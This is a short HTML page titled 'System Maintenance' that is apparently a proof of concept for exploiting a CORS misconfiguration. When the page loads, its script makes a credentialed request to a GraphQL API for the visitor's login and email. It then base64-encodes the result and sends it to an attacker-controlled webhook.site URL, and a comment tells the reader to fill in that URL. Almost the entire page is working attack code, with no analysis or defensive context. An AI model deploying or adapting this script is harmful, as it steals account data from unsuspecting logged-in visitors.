<!DOCTYPE html>
<html>
<body>
    <h1>System Maintenance</h1>
    <script>
        // This script automatically exfiltrates the user's session fingerprint
        // because the API has the '*' CORS flaw you found.
        fetch('https://api.github.com/graphql', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            credentials: 'include',
            body: JSON.stringify({ query: 'query { viewer { login email } }' })
        })
        .then(r => r.json())
        .then(data => {
            // REPLACE THIS URL with your webhook.site URL to see the data hit
            fetch('https://webhook.site/YOUR-UNIQUE-ID?data=' + btoa(JSON.stringify(data)));
        });
    </script>
</body>
</html>
